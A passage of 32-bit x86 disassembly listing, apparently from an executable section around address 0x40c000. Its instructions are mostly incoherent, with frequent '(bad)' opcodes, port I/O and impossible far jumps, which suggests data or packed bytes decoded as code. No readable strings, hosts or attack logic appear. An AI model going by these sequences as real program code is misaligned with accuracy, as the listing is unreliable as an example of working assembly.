  40bcec:	adc    BYTE PTR [eax],dl
  40bcee:	hlt    
  40bcef:	lods   al,BYTE PTR ds:[esi]
  40bcf0:	dec    ecx
  40bcf1:	loopne 0x40bd16
  40bcf3:	arpl   WORD PTR [eax],bx
  40bcf5:	mov    cl,0xfc
  40bcf7:	jecxz  0x40bd13
  40bcf9:	lods   eax,DWORD PTR ds:[esi]
  40bcfa:	mov    ecx,0xe2d81718
  40bcff:	and    al,0xdb
  40bd01:	je     0x40bd73
  40bd03:	sbb    dh,BYTE PTR [esi]
  40bd05:	rcl    BYTE PTR [eax-0x2a],cl
  40bd08:	mov    bl,0xdf
  40bd0a:	aaa    
  40bd0b:	cmp    ah,0xba
  40bd0e:	mov    ds:0x426f4d2e,eax
  40bd13:	sbb    esi,DWORD PTR [edx+0x61d8e445]
  40bd19:	jne    0x40bd71
  40bd1b:	fcomp  DWORD PTR ds:0x323e4b75
  40bd21:	xor    eax,0x3b26c0d0
  40bd26:	(bad)  
  40bd27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd28:	dec    esi
  40bd29:	mov    bl,dl
  40bd2b:	hlt    
  40bd2c:	mov    eax,fs:0x7cadd949
  40bd32:	or     BYTE PTR [ebp+0x6eb5e39e],bh
  40bd38:	dec    ebp
  40bd39:	vmwrite ebx,DWORD PTR [edx+0x4]
  40bd3d:	sbb    ebp,0x44835acf
  40bd43:	mov    WORD PTR [edi-0x4f294c0a],?
  40bd49:	adc    eax,0xe596f970
  40bd4e:	and    BYTE PTR [ecx-0x26],0xf9
  40bd52:	add    dl,BYTE PTR [ecx]
  40bd54:	jp     0x40bd83
  40bd56:	lock jg 0x40bd4c
  40bd59:	imul   ecx,DWORD PTR [ebx],0x15
  40bd5c:	mov    bh,0xf9
  40bd5e:	ja     0x40bd38
  40bd60:	push   cs
  40bd61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd62:	and    DWORD PTR [ebp+0xd35e48],ecx
  40bd68:	ins    BYTE PTR es:[edi],dx
  40bd69:	mov    cl,0xe6
  40bd6b:	cld    
  40bd6c:	jo     0x40bd5c
  40bd6e:	js     0x40bd30
  40bd70:	sbb    DWORD PTR [eax+0x4b],ecx
  40bd73:	xchg   esp,eax
  40bd74:	ss sti 
  40bd76:	xchg   esp,eax
  40bd77:	and    esp,DWORD PTR [esi-0x25]
  40bd7a:	ds sub eax,0x507ee92e
  40bd80:	aas    
  40bd81:	push   ecx
  40bd82:	jle    0x40be00
  40bd84:	or     DWORD PTR [esi-0x20badbe6],esi
  40bd8a:	push   eax
  40bd8b:	rcr    BYTE PTR [ebx],cl
  40bd8d:	popa   
  40bd8e:	jmp    0x40bd4f
  40bd90:	cdq    
  40bd91:	(bad)  
  40bd92:	xlat   BYTE PTR ds:[ebx]
  40bd93:	out    dx,al
  40bd94:	ret    
  40bd95:	(bad)  
  40bd96:	cmp    ebx,edx
  40bd98:	imul   esp,edx,0xffffffac
  40bd9b:	arpl   WORD PTR [edi+0x68],sp
  40bd9e:	dec    edi
  40bda0:	mov    bh,0xe2
  40bda2:	repnz pop ss
  40bda4:	mov    eax,ds:0xdf6b55f3
  40bda9:	push   esi
  40bdaa:	adc    DWORD PTR [ebp+ebx*1+0x1c10b484],ecx
  40bdb1:	mov    bl,0x92
  40bdb3:	stos   DWORD PTR es:[edi],eax
  40bdb4:	sub    dh,ah
  40bdb6:	jne    0x40bd42
  40bdb8:	mov    edi,0x451ec6b8
  40bdbd:	in     al,dx
  40bdbe:	inc    esi
  40bdbf:	in     eax,dx
  40bdc0:	ror    esp,cl
  40bdc2:	aas    
  40bdc3:	int    0x70
  40bdc5:	outs   dx,BYTE PTR ds:[esi]
  40bdc6:	xor    DWORD PTR [esi],esi
  40bdc8:	xchg   edi,eax
  40bdc9:	xchg   ecx,eax
  40bdca:	ret    0xa24b
  40bdcd:	shr    edx,1
  40bdcf:	lock clc 
  40bdd1:	out    dx,al
  40bdd2:	arpl   di,cx
  40bdd4:	clc    
  40bdd5:	rcr    BYTE PTR [edi],0x6c
  40bdd8:	test   al,0xc1
  40bdda:	sub    al,0x89
  40bddc:	fld    st(4)
  40bdde:	aad    0xe9
  40bde0:	idiv   DWORD PTR [ebp-0xe71f079]
  40bde6:	scas   eax,DWORD PTR es:[edi]
  40bde7:	jp     0x40bd9f
  40bde9:	js     0x40bd89
  40bdeb:	mov    eax,0xc487cabe
  40bdf0:	call   0x81b77909
  40bdf5:	cmp    al,0x66
  40bdf7:	and    cl,ch
  40bdf9:	pop    eax
  40bdfa:	and    ch,BYTE PTR [ebp-0x7]
  40bdfd:	or     eax,0xa246a06c
  40be02:	xchg   DWORD PTR [edi],edi
  40be04:	add    esi,DWORD PTR [edx+ecx*1-0x939ba16]
  40be0b:	mov    eax,ds:0xd4d39592
  40be10:	in     al,0x9
  40be12:	push   ebp
  40be13:	pop    esp
  40be14:	cmc    
  40be15:	aad    0x81
  40be17:	dec    edi
  40be18:	mov    eax,0x65ac4c2c
  40be1d:	push   esi
  40be1e:	inc    ebx
  40be1f:	loop   0x40bdcb
  40be21:	dec    esi
  40be22:	mov    esp,0xf00abb50
  40be27:	jle    0x40bdc2
  40be29:	bound  ebp,QWORD PTR [edi-0x27]
  40be2c:	add    dl,cl
  40be2e:	sub    bl,BYTE PTR [edx+edx*1-0xa]
  40be32:	sbb    esi,DWORD PTR [ecx]
  40be34:	sbb    DWORD PTR [edi],eax
  40be36:	mov    esi,0xd1137bb0
  40be3b:	sbb    esi,0x451dbb00
  40be41:	pop    eax
  40be42:	xor    BYTE PTR [edx+edi*2],bl
  40be45:	cli    
  40be46:	or     ecx,ecx
  40be48:	xchg   esi,eax
  40be49:	jnp    0x40be4d
  40be4b:	fcmovnu st,st(2)
  40be4d:	push   eax
  40be4e:	lds    edx,FWORD PTR [edi+0x70722b49]
  40be54:	int    0x15
  40be56:	pop    ds
  40be57:	iret   
  40be58:	loopne 0x40becd
  40be5a:	xlat   BYTE PTR ss:[ebx]
  40be5c:	pop    ebx
  40be5d:	addr16 mov al,ds:0xd091
  40be61:	outs   dx,DWORD PTR ds:[esi]
  40be62:	mov    ebx,0x85f270f3
  40be67:	or     eax,0x1f6813ba
  40be6c:	ds jle 0x40be44
  40be6f:	mov    al,BYTE PTR [ecx+0x626a7a37]
  40be75:	mul    BYTE PTR [edi-0x1d]
  40be78:	and    al,0x7c
  40be7a:	adc    al,0x58
  40be7c:	add    bl,ah
  40be7e:	add    DWORD PTR [ecx-0x6cf50a2e],0x28084e69
  40be88:	mov    eax,ds:0xfa6bddd
  40be8d:	mov    cl,0x94
  40be8f:	adc    edi,DWORD PTR [esi+0x4a]
  40be92:	pop    ebp
  40be93:	push   edi
  40be94:	std    
  40be95:	inc    ebp
  40be96:	jns    0x40befd
  40be98:	sbb    BYTE PTR [ebx+0x2061d127],0xe5
  40be9f:	scas   al,BYTE PTR es:[edi]
  40bea0:	retf   
  40bea1:	adc    cl,BYTE PTR [edi+ebp*1-0x4d]
  40bea5:	out    dx,al
  40bea6:	lods   al,BYTE PTR cs:[esi]
  40bea8:	adc    DWORD PTR [ebp-0x5d],eax
  40beab:	out    0x1b,al
  40bead:	dec    ecx
  40beae:	daa    
  40beaf:	mov    edx,0xbfaafada
  40beb4:	and    BYTE PTR [eax+0x66],al
  40beb7:	fmul   st,st(1)
  40beb9:	sbb    DWORD PTR [edx],edx
  40bebb:	rol    DWORD PTR [ebx],cl
  40bebd:	jge    0x40be87
  40bebf:	jno    0x40bf38
  40bec1:	stc    
  40bec2:	pop    ebx
  40bec3:	rol    BYTE PTR [edi],1
  40bec5:	das    
  40bec6:	jecxz  0x40be8a
  40bec8:	loop   0x40bec8
  40beca:	lds    edi,FWORD PTR [ebp+ebp*2+0x7c]
  40bece:	loop   0x40be95
  40bed0:	jb     0x40bf1f
  40bed2:	mov    ah,BYTE PTR [ecx-0x546a7213]
  40bed8:	pop    edx
  40bed9:	push   ds
  40beda:	mov    bl,BYTE PTR [esi+0x71]
  40bedd:	mov    eax,ds:0x40954bcf
  40bee2:	pop    eax
  40bee3:	int    0xba
  40bee5:	sbb    DWORD PTR [eax+0x49],ebx
  40bee8:	stc    
  40bee9:	out    0x8d,al
  40beeb:	mov    ebx,0x7a01672f
  40bef0:	adc    BYTE PTR [eax+0x2f882ebb],dl
  40bef6:	dec    edi
  40bef7:	mov    ecx,0x626a42e3
  40befc:	cs jbe 0x40bf13
  40beff:	sub    bl,bl
  40bf01:	(bad)  
  40bf02:	in     al,dx
  40bf03:	pop    es
  40bf04:	sahf   
  40bf05:	das    
  40bf06:	mov    edi,0x3103182f
  40bf0b:	test   al,0x39
  40bf0d:	enter  0x6444,0x95
  40bf11:	in     al,dx
  40bf12:	and    DWORD PTR [edx],edi
  40bf14:	xor    al,0x24
  40bf16:	and    eax,0x75eb5269
  40bf1b:	dec    ebp
  40bf1c:	loop   0x40bebd
  40bf1e:	mov    eax,ds:0x933a0a9c
  40bf23:	cdq    
  40bf24:	push   edi
  40bf25:	xor    al,0x87
  40bf27:	call   0x7a1c:0x59e50999
  40bf2e:	adc    dh,al
  40bf30:	scas   eax,DWORD PTR es:[edi]
  40bf31:	xor    eax,0x62010a2f
  40bf36:	(bad)  
  40bf37:	or     DWORD PTR fs:[ebx+0x18],ecx
  40bf3b:	xchg   esp,eax
  40bf3c:	(bad)  
  40bf3e:	int3   
  40bf3f:	pop    ebp
  40bf40:	jno    0x40bf74
  40bf42:	cmc    
  40bf43:	je     0x40bfaf
  40bf45:	push   ecx
  40bf46:	cmp    eax,0x6ba10f61
  40bf4b:	retf   
  40bf4c:	je     0x40bfaf
  40bf4e:	into   
  40bf4f:	ins    DWORD PTR es:[edi],dx
  40bf50:	add    DWORD PTR [edx-0x1d],0x76e791b1
  40bf57:	inc    ebp
  40bf58:	and    DWORD PTR [ecx+0x16],0xffffff89
  40bf5c:	jae    0xb5529f1e
  40bf62:	pop    edx
  40bf63:	push   cs
  40bf64:	pop    ss
  40bf65:	je     0x40bf4e
  40bf67:	jbe    0x40bf8a
  40bf69:	int    0x7d
  40bf6b:	sbb    ecx,ecx
  40bf6d:	das    
  40bf6e:	jo     0x40bfa6
  40bf70:	pop    esi
  40bf71:	jne    0x40bf6e
  40bf73:	dec    esi
  40bf74:	mov    edi,0x2246612a
  40bf79:	test   eax,0xad017c5a
  40bf7e:	pop    ebx
  40bf7f:	in     eax,0x47
  40bf81:	int    0xe1
  40bf83:	push   ebx
  40bf84:	pop    edx
  40bf85:	ss dec edi
  40bf87:	cld    
  40bf88:	inc    DWORD PTR [eax]
  40bf8a:	pop    esp
  40bf8b:	mov    bh,0x11
  40bf8d:	and    BYTE PTR [ebp+0x3784b229],cl
  40bf93:	cmp    al,bl
  40bf95:	and    al,BYTE PTR [edx]
  40bf97:	stos   BYTE PTR es:[edi],al
  40bf98:	inc    esi
  40bf99:	add    al,0x55
  40bf9b:	jmp    0x40bf75
  40bf9d:	jl     0x40bf9b
  40bf9f:	call   0x51b6:0x836de622
  40bfa6:	test   eax,0x291dc2db
  40bfab:	test   DWORD PTR [esi-0x4d],0x4833f4ef
  40bfb2:	retf   0x81d3
  40bfb5:	repz cmp DWORD PTR [edi+0x65e533f2],eax
  40bfbc:	out    dx,al
  40bfbd:	sahf   
  40bfbe:	sub    ah,BYTE PTR [ecx+0x3]
  40bfc1:	mov    BYTE PTR [bx+di-0x60],0xe
  40bfc6:	add    DWORD PTR [ebp+0x48],esi
  40bfc9:	mov    ebp,?
  40bfcb:	jne    0x40c04a
  40bfcd:	cmp    DWORD PTR [edi],0x513df798
  40bfd3:	fwait
  40bfd4:	push   ds
  40bfd5:	stc    
  40bfd6:	dec    ecx
  40bfd7:	popf   
  40bfd8:	pusha  
  40bfd9:	pusha  
  40bfda:	clc    
  40bfdb:	or     al,0x96
  40bfdd:	test   BYTE PTR [esi],cl
  40bfdf:	inc    ecx
  40bfe0:	out    dx,al
  40bfe1:	adc    al,0x8e
  40bfe3:	aas    
  40bfe4:	pop    esi
  40bfe5:	out    dx,eax
  40bfe6:	pop    ebx
  40bfe7:	xor    esi,edi
  40bfe9:	imul   ecx,DWORD PTR [ebx+0x198e77c1],0xffffffb4
  40bff0:	test   al,ch
  40bff2:	xor    BYTE PTR [ecx],dl
  40bff4:	loope  0x40bfd1
  40bff6:	adc    BYTE PTR [ebp+0x15fbdd2d],dh
  40bffc:	inc    ebp
  40bffd:	sub    bl,BYTE PTR [eax-0x67e060fc]
  40c003:	xor    DWORD PTR [ecx+0x76],esi
  40c006:	dec    edi
  40c007:	or     BYTE PTR [esi-0x47882693],cl
  40c00d:	jae    0x40c034
  40c00f:	mov    ebx,DWORD PTR [ecx]
  40c011:	dec    ebx
  40c012:	inc    ebp
  40c013:	push   eax
  40c014:	aam    0x1
  40c016:	sub    DWORD PTR [eax+0x50f99b3d],eax
  40c01c:	xchg   ecx,eax
  40c01d:	test   DWORD PTR [edx],esp
  40c01f:	cmp    BYTE PTR [edx],ch
  40c021:	sub    al,0x16
  40c023:	mov    bl,0xf1
  40c025:	jecxz  0x40bfa7
  40c027:	cdq    
  40c028:	rol    BYTE PTR [esp+edx*1+0x66],cl
  40c02c:	int    0xf1
  40c02e:	sub    ebp,DWORD PTR [edi+0x78d954a3]
  40c034:	and    ecx,DWORD PTR [eax+0x195194c3]
  40c03a:	mov    esi,0x447b60f8
  40c03f:	out    0xcb,al
  40c041:	add    BYTE PTR [esi-0x5d7954dc],al
  40c047:	lds    edx,FWORD PTR [eax+0x75]
  40c04a:	jo     0x40c090
  40c04c:	mov    ds:0x7665af9a,al
  40c051:	in     al,dx
  40c052:	(bad)  
  40c053:	ds popa 
  40c055:	sub    DWORD PTR ds:0x44f9c42b,0x425de7f8
  40c05f:	dec    ebp
  40c060:	ins    DWORD PTR es:[edi],dx
  40c061:	inc    ebx
  40c062:	mov    ch,0xfc
  40c064:	loop   0x40c05d
  40c066:	int3   
  40c067:	or     DWORD PTR [ecx-0x5d],0x47
  40c06b:	(bad)  
  40c06c:	and    eax,0x6c0297e2
  40c071:	xchg   ebx,eax
  40c072:	jge    0x40c0cc
  40c074:	outs   dx,DWORD PTR ds:[esi]
  40c075:	cmp    DWORD PTR [ebp-0x643a228b],ebp
  40c07b:	mov    dh,0xf7
  40c07d:	int3   
  40c07e:	iret   
  40c07f:	or     DWORD PTR [edi],ecx
  40c081:	(bad)  
  40c082:	hlt    
  40c083:	and    edi,DWORD PTR [esi]
  40c085:	jns    0x40c008
  40c087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c088:	mov    cl,BYTE PTR ds:0x3885703e
  40c08e:	fwait
  40c08f:	inc    ecx
  40c090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c091:	jmp    0x40c031
  40c093:	pop    ss
  40c094:	dec    ecx
  40c095:	push   0x2c2f46cc
  40c09a:	push   DWORD PTR [esi+0x65]
  40c09d:	mov    eax,0x523e0bb8
  40c0a2:	in     al,dx
  40c0a3:	sub    bh,0xf
  40c0a6:	test   al,0x2e
  40c0a8:	push   edx
  40c0a9:	xchg   ebp,eax
  40c0aa:	scas   eax,DWORD PTR es:[edi]
  40c0ab:	push   cs
  40c0ac:	imul   ecx,DWORD PTR [ecx+0x7f],0x8553c8c7
  40c0b3:	(bad)  
  40c0b4:	pop    ebp
  40c0b5:	retf   0x9823
  40c0b8:	(bad)  [ecx+0x23]
  40c0bb:	jbe    0x40c09f
  40c0bd:	bound  edx,QWORD PTR [edx]
  40c0bf:	fldenv [edi-0x2e]
  40c0c2:	cli    
  40c0c3:	ss ins DWORD PTR es:[edi],dx
  40c0c5:	push   ebx
  40c0c6:	mov    ds:0x8e90ea51,eax
  40c0cb:	shr    DWORD PTR [edx-0x6baf0ad3],0xfa
  40c0d2:	mov    dh,0xf6
  40c0d4:	sub    bh,BYTE PTR [edi+0x61]
  40c0d7:	and    bl,BYTE PTR [eax]
  40c0d9:	push   eax
  40c0da:	idiv   DWORD PTR [ecx+0x7f4f8913]
  40c0e0:	lock dec esp
  40c0e2:	(bad)
  40c0e6:	ins    DWORD PTR es:[edi],dx
  40c0e7:	sub    al,0x38
  40c0e9:	xor    eax,0x23b2be88
  40c0ee:	inc    esp
  40c0ef:	xor    ecx,DWORD PTR [esi+0x2918f823]
  40c0f5:	das    
  40c0f6:	data16 outs dx,BYTE PTR ds:[esi]
  40c0f8:	mov    DWORD PTR [edx],ebp
  40c0fa:	sbb    BYTE PTR [esp+ebx*1-0x79],ah
  40c0fe:	sar    DWORD PTR [eax],1
  40c100:	paddd  mm3,QWORD PTR [eax+0x1b]
  40c104:	sub    eax,0xfd24eded
  40c109:	adc    al,0xb5
  40c10b:	out    0xaf,eax
  40c10d:	mov    ah,0xfb
  40c10f:	sub    dh,bl
  40c111:	mov    cl,0x7f
  40c113:	test   eax,0x7252614
  40c118:	popa   
  40c119:	pushf  
  40c11a:	mov    ecx,0x4a06d678
  40c11f:	xlat   BYTE PTR ds:[ebx]
  40c120:	or     BYTE PTR [edi],bl
  40c122:	sar    DWORD PTR [eax-0x72f2c0a4],0x9b
  40c129:	rep ins DWORD PTR es:[edi],dx
  40c12b:	push   ss
  40c12c:	or     ah,bl
  40c12e:	std    
  40c12f:	mov    esi,0x6f36b66f
  40c134:	and    eax,0xfb06e2c8
  40c139:	shl    DWORD PTR [edx],0xbc
  40c13c:	and    esp,DWORD PTR [edx-0x44]
  40c13f:	lock xor al,0x57
  40c142:	out    dx,eax
  40c143:	jecxz  0x40c180
  40c145:	out    0x85,al
  40c147:	mov    bh,0x12
  40c149:	out    0x5d,eax
  40c14b:	enter  0x6fe3,0x37
  40c14f:	out    0x4,al
  40c151:	ret    0xfd45
  40c154:	push   edi
  40c155:	adc    al,0x71
  40c157:	add    al,0x2a
  40c159:	stos   BYTE PTR es:[edi],al
  40c15a:	ret    0x48ba
  40c15d:	(bad)  
  40c15f:	outs   dx,BYTE PTR ds:[esi]
  40c160:	pop    esp
  40c161:	or     DWORD PTR ds:0xd08b8d1a,edx
  40c167:	lea    ebx,[ebx-0x1f]
  40c16a:	popa   
  40c16b:	inc    eax
  40c16c:	dec    esp
  40c16d:	sbb    DWORD PTR [eax-0x57],esp
  40c170:	mov    ds:0x37b2fc1c,eax
  40c175:	sbb    BYTE PTR [edi],bl
  40c177:	xchg   DWORD PTR [edx],ecx
  40c179:	lds    edi,FWORD PTR [ebp-0x32]
  40c17c:	lods   eax,DWORD PTR ds:[esi]
  40c17d:	fdivr  DWORD PTR [eax+0x190e4d88]
  40c183:	dec    edx
  40c184:	arpl   dx,si
  40c186:	mov    esp,ebp
  40c188:	aad    0x79
  40c18a:	push   0x76053d6d
  40c18f:	pop    ds
  40c190:	mov    ah,0xf2
  40c192:	jne    0x40c17d
  40c194:	inc    ecx
  40c195:	lds    ebx,FWORD PTR [ebp-0x7c]
  40c198:	leave  
  40c199:	mov    eax,0xd826bcac
  40c19e:	imul   ebx,DWORD PTR [edi+0x409287a9],0x41
  40c1a5:	mov    cl,0xe
  40c1a7:	popa   
  40c1a8:	js     0x40c214
  40c1aa:	xor    esp,DWORD PTR [esi]
  40c1ac:	mov    bl,0xec
  40c1ae:	adc    al,0x95
  40c1b0:	out    dx,al
  40c1b1:	sbb    eax,0x203980a3
  40c1b6:	add    BYTE PTR [edx-0x1e],bl
  40c1b9:	pop    ebx
  40c1ba:	cli    
  40c1bb:	push   edx
  40c1bc:	mov    cl,0x4
  40c1be:	test   eax,0x22accb89
  40c1c3:	xchg   DWORD PTR [ebx-0x6edc8d75],ecx
  40c1c9:	ss scas al,BYTE PTR es:[edi]
  40c1cb:	pop    ecx
  40c1cc:	pop    eax
  40c1cd:	stos   BYTE PTR es:[edi],al
  40c1ce:	fld    DWORD PTR [esi+0x13]
  40c1d1:	adc    BYTE PTR [esi+ebx*4-0x74a79e82],bl
  40c1d8:	mov    cl,0xfd
  40c1da:	(bad)  
  40c1db:	in     al,0x1b
  40c1dd:	(bad)  
  40c1de:	imul   eax,DWORD PTR [esi-0x151d9f24],0x6fee6279
  40c1e8:	adc    dh,cl
  40c1ea:	jle    0x40c16f
  40c1ec:	ret    0x45d9
  40c1ef:	es sub eax,0xddf3e177
  40c1f5:	fwait
  40c1f6:	inc    esi
  40c1f7:	pop    esi
  40c1f8:	jl     0x40c1a0
  40c1fa:	push   cs
  40c1fb:	aad    0x77
  40c1fd:	push   0x3c5acdf0
  40c202:	inc    eax
  40c203:	ja     0x40c215
  40c205:	mov    cl,0xac
  40c207:	mov    cl,0xc2
  40c209:	add    dl,ch
  40c20b:	in     al,dx
  40c20c:	inc    esp
  40c20d:	jns    0x40c28a
  40c20f:	cmp    DWORD PTR [ebx+0x48536903],esp
  40c215:	retf   0x399d
  40c218:	js     0x40c278
  40c21a:	dec    ebp
  40c21b:	ss sub BYTE PTR cs:[esi],bl
  40c21f:	jge    0x40c1ca
  40c221:	dec    ebx
  40c222:	fnstcw WORD PTR [edi-0x3e9cbd62]
  40c228:	test   al,0x28
  40c22a:	sub    eax,0x48574c26
  40c22f:	loope  0x40c28e
  40c231:	xchg   ecx,eax
  40c232:	pop    edi
  40c233:	neg    DWORD PTR [ebx]
  40c235:	push   ebx
  40c236:	xchg   esi,eax
  40c237:	mov    dh,0x90
  40c239:	mov    cl,0x1c
  40c23b:	and    edx,ecx
  40c23d:	scas   al,BYTE PTR es:[edi]
  40c23e:	ins    BYTE PTR es:[edi],dx
  40c23f:	xchg   ebp,eax
  40c240:	mov    ebp,0x4b9860c4
  40c245:	cmc    
  40c246:	jnp    0x40c292
  40c248:	sbb    edi,DWORD PTR [edi+0xf]
  40c24b:	(bad)  
  40c24c:	mov    ebx,0x1d21c4db
  40c251:	jns    0x40c24c
  40c253:	ja     0x40c2bb
  40c255:	rcl    DWORD PTR [eax+ebp*8-0x2a916f40],cl
  40c25c:	test   eax,0x7ad9c298
  40c261:	xor    ecx,DWORD PTR [eax+edi*8+0x5]
  40c265:	test   DWORD PTR [ecx],edi
  40c267:	aaa    
  40c268:	push   edx
  40c269:	rcl    esi,0xf8
  40c26c:	stos   BYTE PTR es:[edi],al
  40c26d:	sub    dh,BYTE PTR [esi+0x496c6201]
  40c273:	dec    edx
  40c274:	int3   
  40c275:	and    BYTE PTR [ebx-0x38],cl
  40c278:	add    BYTE PTR [esi-0x1],ah
  40c27b:	je     0x40c1fe
  40c27d:	fbstp  TBYTE PTR [eax-0x7]
  40c280:	push   esi
  40c281:	aas    
  40c282:	xchg   esi,eax
  40c283:	push   edx
  40c284:	add    al,0x31
  40c286:	jo     0x40c2c0
  40c288:	lods   eax,DWORD PTR ds:[esi]
  40c289:	scas   eax,DWORD PTR es:[edi]
  40c28a:	dec    ebp
  40c28b:	mov    bl,0xad
  40c28d:	retf   0xc891
  40c290:	push   0xfffffff9
  40c292:	sub    cl,bh
  40c294:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c296:	inc    eax
  40c297:	mov    bl,0xc0
  40c299:	and    BYTE PTR [eax+0x39d4383],ah
  40c29f:	push   eax
  40c2a0:	rcl    DWORD PTR [eax-0xd],0x35
  40c2a4:	mov    dx,0x399b
  40c2a8:	dec    ebx
  40c2a9:	cld    
  40c2aa:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c2ac:	jge    0x40c25f
  40c2ae:	add    eax,0xc0c1417e
  40c2b3:	mov    al,0xbd
  40c2b5:	sti    
  40c2b6:	ror    BYTE PTR [ebp+0xf],1
  40c2b9:	pop    esi
  40c2ba:	xor    bl,BYTE PTR [eax]
  40c2bc:	pop    edx
  40c2bd:	jo     0x40c2e0
  40c2bf:	addr16 push ebp
  40c2c1:	push   eax
  40c2c2:	in     al,dx
  40c2c3:	bound  esi,QWORD PTR [ebx-0x4b]
  40c2c6:	jo     0x40c33c
  40c2c8:	stos   DWORD PTR es:[edi],eax
  40c2c9:	jnp    0x40c254
  40c2cb:	sub    al,0xb8
  40c2cd:	xlat   BYTE PTR ds:[ebx]
  40c2ce:	cld    
  40c2cf:	xchg   edx,eax
  40c2d0:	or     eax,0xe596865a
  40c2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2d6:	jecxz  0x40c33a
  40c2d8:	(bad)  
  40c2d9:	out    dx,al
  40c2da:	repnz and dh,BYTE PTR [ebp-0x65]
  40c2de:	lea    edi,[ecx+0xe]
  40c2e1:	mov    esp,0xefa58cd3
  40c2e6:	dec    eax
  40c2e7:	fadd   QWORD PTR [ebx-0x10491af8]
  40c2ed:	scas   eax,DWORD PTR es:[edi]
  40c2ee:	arpl   WORD PTR [ebx-0x77],bp
  40c2f1:	out    0xbb,eax
  40c2f3:	xor    bh,ah
  40c2f5:	test   eax,0x304257d7
  40c2fa:	and    eax,0x8465f8f9
  40c2ff:	fs pop ds
  40c301:	in     eax,0x77
  40c303:	inc    ebx
  40c304:	leave  
  40c305:	jbe    0x40c2d6
  40c307:	cmp    DWORD PTR [ebx-0x57c73e35],edx
  40c30d:	ds sbb al,0x6e
  40c310:	jbe    0x40c2fb
  40c312:	pop    ebp
  40c313:	pop    es
  40c314:	xchg   ebx,eax
  40c315:	pop    es
  40c316:	mov    edi,0x96b55569
  40c31b:	mov    edx,0x422cd0ce
  40c320:	inc    ebx
  40c321:	mov    ch,0xff
  40c323:	imul   esp,ecx,0xffffff8e
  40c326:	mov    eax,0x91f38b1b
  40c32b:	nop
  40c32c:	ficom  DWORD PTR [ebp+0x180a8ee4]
  40c332:	enter  0xe44d,0x6c
  40c336:	jmp    0xaa6a:0xf98d9566
  40c33d:	add    esp,ecx
  40c33f:	xchg   ebp,eax
  40c340:	xor    ebx,DWORD PTR [esi]
  40c342:	imul   esi,ebx,0x1a8bb3e1
  40c348:	clc    
  40c349:	jo     0x40c335
  40c34b:	xchg   edx,eax
  40c34c:	or     BYTE PTR [edi+0x5c],0xba
  40c350:	add    eax,0x14f8535f
  40c355:	mov    esp,0x8389d4ee
  40c35a:	jmp    DWORD PTR gs:[eax-0x20]
  40c35e:	push   cs
  40c35f:	pushf  
  40c360:	inc    ecx
  40c361:	pop    edx
  40c362:	and    DWORD PTR [eax],edi
  40c364:	into   
  40c365:	inc    ebp
  40c366:	test   DWORD PTR [eax+0x3e],ebp
  40c369:	mov    ecx,0xbe87ceb6
  40c36e:	jno    0x40c3c3
  40c370:	mov    esp,0xd322a7ca
  40c375:	jo     0x40c362
  40c377:	movntq QWORD PTR [esi],mm3
  40c37a:	xchg   ebp,eax
  40c37b:	popa   
  40c37c:	fdivr  QWORD PTR [eax-0x27]
  40c37f:	popa   
  40c380:	test   al,0x3e
  40c382:	cmp    al,BYTE PTR [ebx+0x63]
  40c385:	jo     0x40c3a4
  40c387:	add    eax,0xc847c3c4
  40c38c:	sub    al,0x9c
  40c38e:	cmc    
  40c38f:	lods   al,BYTE PTR fs:[esi]
  40c391:	pop    esp
  40c392:	loop   0x40c405
  40c394:	mov    ?,WORD PTR [eax+0x63]
  40c397:	in     al,0x6c
  40c399:	add    ebx,DWORD PTR [edi]
  40c39b:	xchg   edi,eax
  40c39c:	fidiv  WORD PTR [edi-0x22b275b4]
  40c3a2:	adc    al,0xfd
  40c3a5:	in     eax,0xd3
  40c3a7:	repnz mov dl,0xc4
  40c3aa:	scas   al,BYTE PTR es:[edi]
  40c3ab:	push   ebp
  40c3ac:	(bad)  
  40c3ad:	loopne 0x40c38d
  40c3af:	push   esi
  40c3b0:	push   cs
  40c3b1:	pushf  
  40c3b2:	nop
  40c3b3:	xchg   esp,eax
  40c3b4:	clc    
  40c3b5:	mov    ds:0xf8c6e2be,al
  40c3ba:	sub    al,0xd8
  40c3bc:	push   cs
  40c3bd:	lock xor ch,dh
  40c3c0:	inc    esp
  40c3c1:	push   0xffffffab
  40c3c3:	mov    ebx,0x236dfa61
  40c3c8:	aad    0xf5
  40c3ca:	mov    dh,cl
  40c3cc:	ja     0x40c366
  40c3ce:	and    ecx,edx
  40c3d0:	xlat   BYTE PTR ds:[ebx]
  40c3d1:	add    edi,edi
  40c3d3:	jbe    0x40c43b
  40c3d5:	adc    al,0xa6
  40c3d7:	push   ss
  40c3d8:	xchg   esp,eax
  40c3d9:	mov    dh,0x51
  40c3db:	add    al,0x7f
  40c3dd:	add    DWORD PTR [edi],eax
  40c3df:	sbb    BYTE PTR [edi+ecx*4-0x36],cl
  40c3e3:	xchg   ecx,eax
  40c3e4:	neg    BYTE PTR [esi+0x4]
  40c3e7:	xor    ecx,ebp
  40c3e9:	fimul  DWORD PTR [ebx]
  40c3eb:	in     al,0x46
  40c3ed:	pop    edi
  40c3ee:	xchg   ebx,eax
  40c3ef:	jo     0x40c464
  40c3f1:	in     al,dx
  40c3f2:	cmp    eax,DWORD PTR [ebx+0x62]
  40c3f5:	test   BYTE PTR [ebx+0x74],dh
  40c3f8:	ffreep st(1)
  40c3fa:	or     ah,bl
  40c3fc:	xor    esp,DWORD PTR [edx+ecx*4-0x3447e8cb]
  40c403:	and    eax,0x28fba70f
  40c408:	and    bl,BYTE PTR [ecx]
  40c40a:	mov    esp,0x25abe4fa
  40c40f:	in     eax,dx
  40c410:	repnz retf 0x285f
  40c414:	imul   ebp,DWORD PTR [esi+0x6761e2c9],0xae4635ca
  40c41e:	cmp    dh,ch
  40c420:	pop    esp
  40c421:	ins    DWORD PTR es:[edi],dx
  40c422:	rcl    esi,1
  40c424:	shr    BYTE PTR [esi+ebx*1+0x5],1
  40c428:	and    edx,DWORD PTR [bx+0x6c]
  40c42c:	outs   dx,DWORD PTR ds:[esi]
  40c42d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c42e:	and    al,0xc5
  40c430:	ds xor al,0x5c
